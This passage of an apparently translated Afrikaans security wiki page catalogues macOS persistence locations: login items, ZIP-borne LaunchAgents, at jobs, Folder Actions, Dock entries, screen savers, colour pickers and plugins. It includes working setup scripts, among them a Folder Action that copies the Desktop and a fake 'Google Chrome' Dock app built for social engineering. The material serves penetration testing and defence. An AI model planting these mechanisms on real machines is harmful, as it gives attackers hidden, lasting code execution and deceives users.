Vir ’n gebundelde launch-plist, los `BundleProgram` **relatief tot die toepassingbondel se wortelgids op** (byvoorbeeld `Contents/MacOS/Helper`), soos [Apple se riglyne vir die migrasie van Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) spesifiseer. ’n Leesalleen-inventaris van `/Applications` op die navorsings-Mac het 14 gebundelde helper-inskrywings en vyf `BundleProgram`-verklarings gevind; al vyf teikens kon opgelos word, en twee het ’n gebruikerskryfbaarheidstoets geslaag. Daardie toets bewys **nie** dat enige van die helpers geregistreer of geaktiveer is, ná handtekeningvalidering uitvoerbaar is, of deur ’n sandbox bereik kan word nie. `sfltool dumpbtm` het 150 benoemde rekords op hierdie Mac gelys; dit is ’n inspeksiehulpmiddel, nie ’n toets wat bevestig dat elke rekord loop nie.

Ouer aanmelditems kan ook via Apple events bestuur word. Dit is moontlik om hulle vanaf die opdragreël te lys, by te voeg en te verwyder, hoewel byvoeging die gebruiker se aanhoudende aanmeldopstelling verander en dalk Automation-goedkeuring vereis:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` is ’n implementasiebesonderheid, nie ’n ondersteunde plek om ’n payload te installeer deur bloot ’n lêer te skryf nie. Die ouer `SMLoginItemSetEnabled`-API is vir nuwe helpers deur `SMAppService` vervang; die bladsy se voormalige `/var/db/com.apple.xpc.launchd/loginitems.501.plist`-pad was afwesig op die macOS 26.5.2-toetsmasjien. Gebruik die registrasie-API en stelsel-UI-toestand wanneer jy moderne login items beoordeel, nie ’n veronderstelde databasispad nie.

### ZIP as Login Item

(Kyk na die vorige afdeling oor Login Items; dit is ’n uitbreiding)

As jy ’n **ZIP**-lêer as ’n **Login Item** stoor, sal **`Archive Utility`** dit oopmaak. As die zip byvoorbeeld in **`~/Library`** gestoor is en die gids **`LaunchAgents/file.plist`** met ’n backdoor bevat, sal daardie gids geskep word (dit bestaan nie by verstek nie) en die plist sal bygevoeg word. Die volgende keer dat die gebruiker weer aanmeld, sal die **backdoor wat in die plist aangedui word, uitgevoer word**.

Nog ’n opsie is om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep, sodat hierdie tegniek steeds sal werk as die gids LaunchAgents reeds bestaan.

### At

Skrywe: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees

#### **Beskrywing**

`at`-take is ontwerp om **eenmalige take te skeduleer** wat op bepaalde tye uitgevoer moet word. Anders as cron-take word `at`-take ná uitvoering outomaties verwyder. Dit is belangrik om daarop te let dat hierdie take stelselherlaaie oorleef, wat dit onder sekere omstandighede ’n moontlike sekuriteitsrisiko maak.<sup>[[16]](#references)</sup>

Die gebundelde `com.apple.atrun.plist` het `Disabled = true`, maar launchd hou effektiewe geaktiveerde/gedeaktiveerde oorheersings apart by. Op die macOS 26.5.2-toetsmasjien het `launchctl print-disabled system` `com.apple.atrun` as **geaktiveer** gerapporteer, ondanks daardie gebundelde sleutel. Gaan die effektiewe toestand na voordat jy beweer dat `at`-take sal loop:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

’n Administrateur kan ’n gedeaktiveerde `atrun`-diens met `launchctl` aktiveer; die volgende historiese voorbeeld verander die stelseldienstoestand en is **nie** op die navorsings-Mac uitgevoer nie:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dit sal oor 1 uur ’n lêer skep:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Kontroleer die taakry met `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Hierbo kan ons twee take sien wat geskeduleer is. Ons kan die besonderhede van die taak vertoon met `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **taaklêers** kan gevind word by `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Die lêernaam bevat die tou, die taaknommer en die tyd waarop dit geskeduleer is om te loop. Kom ons kyk byvoorbeeld na `a0001a019bdcd2`.

- `a` - dit is die tou
- `0001a` - taaknommer in heksadesimale formaat, `0x1a = 26`
- `019bdcd2` - tyd in heksadesimale formaat. Dit verteenwoordig die minute wat sedert die epoch verloop het. `0x019bdcd2` is `26991826` in desimale formaat. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat is: `GMT: 2021. April 27., Dinsdag 7:46:00`.

As ons die taaklêer druk, vind ons dat dit dieselfde inligting bevat as wat ons met `at -c` gekry het.

### Kalender-waarskuwings om lêers oop te maak

- **Teikenskrywing:** 'n Uitvoerbare programbundel of 'n ander lêer wat reeds deur 'n Kalender-gebeurtenis se pasgemaakte **Open file**-waarskuwing gekies is. Om die waarskuwing self te skep of te wysig, vereis toegang tot daardie Kalender-gebeurtenis via Kalender of 'n aanvaarde kalenderdatabron; 'n skryfbewerking na 'n willekeurige lêer skep nie 'n waarskuwing nie.
- **Sneller:** Die waarskuwing se geskeduleerde tyd op 'n Mac waar Kalender die gebeurtenis verwerk. 'n Herhalende gebeurtenis kan die aksie herhaal. [Apple se huidige Kalender-gids](https://support.apple.com/guide/calendar/icl1012/mac) bevestig die **Custom → Open file**-waarskuwingsopsie op macOS 26.
- **Uitvoeringsidentiteit en voorwaardes:** Kalender maak die gekose lêer vir die aangemelde gebruiker met die geassosieerde toepassing oop. As 'n programbundel begin word, kan die kode daarvan as daardie gebruiker uitgevoer word, onderhewig aan Gatekeeper, kwarantyn en ander macOS-kontroles. 'n Gewone skriflêer kan bloot in 'n redigeerder oopmaak; die lêeruitbreiding alleen bewys nie dat kode uitgevoer word nie.

Om 'n kandidaat veilig te beoordeel, ondersoek die gebeurtenis se waarskuwing in Kalender en die gekose lêer se toestemmings. Hierdie pad is uit Apple se gids gedokumenteer en is **nie** op die navorsings-Mac uitgevoer nie, omdat toetsing 'n aktiewe kalender sou wysig en vereis dat daar vir 'n lessenaatgebeurtenis gewag word. In 'n weggooibare rekening kan 'n toets 'n merker-alleen-programbundel kies, 'n Open file-waarskuwing vir 'n nabye toekomstige tyd instel, die begin daarvan bevestig en daarna die gebeurtenis en program uitvee.

### Shortcuts-outomatiserings op macOS

- **Teikenskrywing:** 'n Uitvoerbare lêer waarna 'n bestaande kortpad se aksie reeds verwys, of 'n bestaande kortpad wat 'n gemagtigde gebruiker kan wysig. 'n Willekeurige `.shortcut`-lêer of 'n skryfbewerking na 'n ongedokumenteerde Shortcuts-databasis is nie 'n ondersteunde manier om outomatisering te registreer nie.
- **Sneller en identiteit:** 'n Voorheen ingestelde, geaktiveerde outomatiseringsgebeurtenis, soos 'n tyd van die dag of 'n toepassingsgebeurtenis, roep die kortpad vir die aangemelde gebruiker aan. [Apple se huidige Mac-outomatiseringsgids](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lys ondersteunde gebeurtenisse, verduidelik wanneer 'n outomatisering sonder bevestiging kan loop en beskryf hoe om 'n sneller te verwyder. [Apple se Shortcuts-privaatheidsgids](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) vereis **Allow Running Scripts** vir skripaksies, en individuele aksies kan steeds toestemmings versoek.

Dit is 'n voorwaardelike skryf-na-uitvoering-pad **slegs wanneer die bestaande aksie 'n skryfbare teiken laai**. Die skep van 'n nuwe outomatisering via die UI verander aktiewe instellings en is nie op die navorsings-Mac probeer nie. In 'n weggooibare rekening kan 'n eienaar 'n tyd-van-die-dag-kortpad instel waarvan die skrip `/tmp/ht-shortcuts-marker` aanraak, die nodige toestemmings aktiveer, die merker ná die gebeurtenis nagaan en dan die outomatisering, kortpad en merker uitvee.

### Automator-aksies en Quick Actions

- **Teikens vir skryfbewerkings:** `~/Library/Automator/*.action` (gebruiker) en `/Library/Automator/*.action` (administrateur) vir aksiebundels. 'n Gestoorde Quick Action-werkvloei word gewoonlik in `~/Library/Services/*.workflow` gehou; kyk na die werklike werkvloeipad wat die gebruiker gekies het. [Apple se Automator-raamwerkverwysing](https://developer.apple.com/documentation/automator) lys die aksiesoekgidse.
- **Sneller:** Automator laai beskikbare aksiebundels wanneer dit loop, maar 'n aksie se taak loop wanneer 'n werkvloei wat dit gebruik, uitgevoer word. 'n Quick Action loop wanneer die gebruiker dit uit Finder, Services of 'n ander beskikbare kieslys kies. 'n Folder Action-werkvloei loop wanneer items by sy **reeds gekoppelde** vouer gevoeg word, en 'n Calendar Alarm-werkvloei loop op die tyd van sy gebeurtenis. [Apple se werkvloeitipes](https://support.apple.com/guide/automator/aut7cac58839/mac) onderskei tussen hierdie gebeurtenisse. Om bloot 'n aksie of werkvloei te skryf, koppel nie 'n vouer of skeduleer 'n kalend gebeurtenis nie.
- **Uitvoeringsidentiteit en voorwaardes:** Die rekening wat die werkvloei uitvoer; Automator of die aanroepende toepassing moet die aksie laai, en enige huidige kodeondertekening- of privaatheidskontroles moet dit toelaat. 'n Skryfbare aksiebundel waarna 'n aktiewe werkvloei reeds verwys, is 'n ander geval as om 'n nuwe aksie te installeer en vir iemand te wag om dit te kies.

Die gebruiker se `Automator`- en `Services`-gidse was teenwoordig op die macOS 26.5.2-toets-Mac; `/Library/Automator` was afwesig. Geen aktiewe werkvloei is geskep, gekoppel of uitgevoer nie. Gebruik 'n weggooibare rekening en 'n merker-alleen-aksie/werkvloei om 'n bepaalde laaipad te bevestig. Die afsonderlike [Folder Actions](#folder-actions)-afdeling dek daardie gebeurtenisbron in meer besonderhede.

### Folder Actions

Skrywe: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Skrywe: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet `osascript` met argumente kan aanroep om met **`System Events`** kontak te maak sodat jy Folder Actions kan instel
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit het basiese TCC-toestemmings soos Desktop, Documents en Downloads

#### Ligging

- **`/Library/Scripts/Folder Action Scripts`**
  - Root word vereis
  - **Sneller**: Toegang tot die gespesifiseerde vouer
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Sneller**: Toegang tot die gespesifiseerde vouer

#### Beskrywing en uitbuiting

Folder Actions is skripte wat outomaties geaktiveer word deur veranderinge in 'n vouer, soos die byvoeging of verwydering van items, of ander aksies soos om die vouervenster oop te maak of die grootte daarvan te verander. Hierdie aksies kan vir verskeie take gebruik word en kan op verskillende maniere geaktiveer word, soos via die Finder-UI of terminaalopdragte.<sup>[[17]](#references)[[18]](#references)</sup>

Om Folder Actions op te stel, het jy opsies soos:

1. Skep 'n Folder Action-werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) en installeer dit as 'n diens.
2. Koppel 'n skrip handmatig via Folder Actions Setup in die kontekskieslys van 'n vouer.
3. Gebruik OSAScript om Apple Event-boodskappe na die `System Events.app` te stuur en 'n Folder Action programmaties op te stel.
   - Hierdie metode is veral nuttig om die aksie in die stelsel in te bed en sodoende 'n mate van volharding te bied.

Die volgende skrip is 'n voorbeeld van wat deur 'n Folder Action uitgevoer kan word:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Om die bogenoemde skrip met Folder Actions bruikbaar te maak, compileer dit met:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nadat die script saamgestel is, stel Folder Actions op deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en die voorheen saamgestelde script spesifiek aan die Desktop-lêergids koppel.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Voer die setup script uit met:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Dit is die manier om hierdie persistence via GUI te implementeer:

Dit is die script wat uitgevoer sal word:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Maak dan die `Folder Actions Setup`-toepassing oop, kies die **lêergids wat jy wil dophou** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

As jy nou daardie lêergids met **Finder** oopmaak, sal jou script uitgevoer word.

Hierdie konfigurasie is in base64-formaat gestoor in die **plist** by **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Kom ons probeer nou om hierdie persistence voor te berei sonder GUI-toegang:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om ’n rugsteunkopie daarvan te maak:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy pas opgestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Noudat ons ’n leë omgewing het

3. Kopieer die rugsteunkopie: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Dit het nie vir my gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock-kortpaaie

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet ’n kwaadwillige toepassing binne die stelsel geïnstalleer hê
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
  - **Sneller**: Wanneer die gebruiker op die toepassing in die Dock klik

#### Beskrywing & Exploitation

Al die toepassings wat in die Dock verskyn, word in die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Dit is moontlik om **’n toepassing by te voeg** met net:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Deur 'n bietjie **social engineering** te gebruik, kan jy **byvoorbeeld Google Chrome naboots** binne die Dock en eintlik jou eie script uitvoer:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Invoermetodes

- **Skryfdoel:** ’n Invoermetode-appbundel wat kode bevat, geïnstalleer in `~/Library/Input Methods/` (gebruiker) of `/Library/Input Methods/` (administrateur). Dit verskil van Apple se gewone teks `.inputplugin`-sleutelbordkarteringslêers, wat nie op hul eie ’n loonvrag met arbitrêre kode is nie.
- **Sneller:** Die gebruiker voeg die invoerbron by/aktiveer dit in **Stelselinstellings → Sleutelbord → Teksinvoer** en kies of gebruik dit dan. Die blote kopiëring van ’n bundel na die gids bewys nie dat macOS dit sal begin nie. [Apple se huidige gids oor invoerbronne](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beskryf hoe om bronne te aktiveer en tussen hulle te wissel; [Apple se InputMethodKit-dokumentasie](https://developer.apple.com/documentation/inputmethodkit) dek invoermetodes wat kode bevat.
- **Uitvoeringsidentiteit en voorwaardes:** Die metode loop vir die aangemelde gebruiker, onderhewig aan registrasie van die invoermetode, kodeondertekening en huidige macOS-sekuriteitskontroles. Bestaande geaktiveerde metodes met ’n skryfbare uitvoerbare lêer vereis ’n aparte hersiening van die pad en handtekening.

Apple se [ouer nota oor derdeparty-invoermetodes](https://developer.apple.com/library/archive/qa/qa1810/_index.html) het reeds gewaarsku dat die kopiëring van sekere paletmetodes na hierdie gidse nie eens verseker dat hulle in Invoerbronne verskyn nie. Op die macOS 26.5.2-navorsings-Mac bestaan die gebruikersgids, maar geen bundel is geïnstalleer of geaktiveer nie; dit is dus ’n gedokumenteerde voorwaardelike pad, nie ’n plaaslike looptydresultaat nie.

### Kleurkiesers

Skrywe: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - ’n Baie spesifieke handeling moet plaasvind
  - Jy sal in ’n ander sandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
  - Root word vereis
  - Sneller: Gebruik die kleurkieser
- `~/Library/ColorPickers`
  - Sneller: Gebruik die kleurkieser

#### Beskrywing en uitbuiting

**Kompileer ’n kleurkieser**-bundel met jou kode (jy kan byvoorbeeld [**hierdie een gebruik**](https://github.com/viktorstrate/color-picker-plus)), voeg ’n constructor by (soos in die [Skermbewaarder-afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wanneer die kleurkieser dan geaktiveer word, behoort jou bundel ook uit te voer.

Dit is afhanklik daarvan dat ’n versoenbare app die stelselkleurpaneel oopmaak en die geïnstalleerde kieser kies. [Apple se gids oor kleurpanele](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beskryf die verouderde bundelliggings. ’n Plaaslike padkontrole het die verouderde kleurkieser-XPC-diens gevind, maar geen kieser is op die navorsings-Mac geïnstalleer of gelaai nie; moenie op grond van die pad alleen ’n TCC-omseiling aflei nie.

Let daarop dat die binêre lêer wat jou biblioteek laai ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Verslag**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Verslag**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nuttig om sandbox te omseil: **Nee, want jy moet jou eie app uitvoer**
- TCC-bypass: Hang af van die sandbox en toestemmings van die geaktiveerde uitbreiding; geen algemene bypass is vasgestel nie.

#### Ligging

- ’n Spesifieke app

#### Beskrywing & Exploit

’n Voorbeeld van ’n toepassing met ’n Finder Sync Extension [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding word in ’n toepassing geplaas wat uitgevoer sal word. Om die uitbreiding se kode te kan uitvoer, **moet dit ook onderteken wees** met ’n geldige Apple-ontwikkelaarsertifikaat, dit moet **gesandbox** wees (hoewel ontspanne uitsonderings bygevoeg kan word), en dit moet met iets soos die volgende geregistreer wees:<sup>[[21]](#references)[[22]](#references)</sup>

’n Geïnstalleerde uitbreiding moet ook **geaktiveer** en opgeroep word vir ’n relevante Finder-ligging of -item; dit is nie genoeg om ’n willekeurige `.appex`-bundel te skryf nie. [Apple se Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stel die geaktiveerde toestand beskikbaar. Die `pluginkit`-opdragte hieronder wys hoe om dit eksplisiet te registreer en te aktiveer, nie hoe om outomaties te begin deur bloot ’n lêer te skep nie. Hierdie metode is aan die dokumentasie getoets; geen nuwe uitbreiding is op die navorsings-Mac geïnstalleer of geaktiveer nie.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Skermbewaarder

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n gewone application sandbox beland
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `/Library/Screen Savers`
  - Root word vereis
  - **Sneller**: Kies die skermbewaarder
- `~/Library/Screen Savers`
  - **Sneller**: Kies die skermbewaarder

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Exploit

Skep ’n nuwe projek in Xcode en kies die template om ’n nuwe **skermbewaarder** te genereer. Voeg dan jou code daarby, byvoorbeeld die volgende code om logs te genereer.<sup>[[23]](#references)[[24]](#references)</sup>

**Bou** dit en kopieer die `.saver`-bundle na **`~/Library/Screen Savers`**. Maak dan die skermbewaarder-GUI oop. As jy daarop klik, behoort dit baie logs te genereer:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Let daarop dat jy **binne die algemene toepassingsandbox** sal wees, omdat jy **`com.apple.security.app-sandbox`** kan vind in die entitlements van die binêre lêer wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`).

Saver-kode:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy sal in ’n application sandbox beland
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die sandbox lyk baie beperk

#### Ligging

- `~/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- `/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
  - Root word vereis
- `/System/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
  - Root word vereis
- `Some.app/Contents/Library/Spotlight/`
  - **Sneller**: ’n Nuwe lêer met ’n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
  - ’n Nuwe app word vereis

#### Beskrywing & Uitbuiting

Spotlight is macOS se ingeboude soekfunksie, wat ontwerp is om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë moontlik te maak, hou Spotlight ’n **eienaardige databasis** by en skep dit ’n indeks deur **die meeste lêers te ontleed**, wat vinnige soektogte deur lêername én hul inhoud moontlik maak.<sup>[[25]](#references)</sup>

Die onderliggende meganisme van Spotlight behels ’n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses orkestreer die hele Spotlight-diens. Daarbenewens voer verskeie 'mdworker'-daemone uiteenlopende instandhoudingstake uit, soos om verskillende lêertipes te indekseer (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-importer-inproppe, of **".mdimporter-bundels**", waarmee Spotlight inhoud in ’n uiteenlopende reeks lêerformate kan verstaan en indekseer.

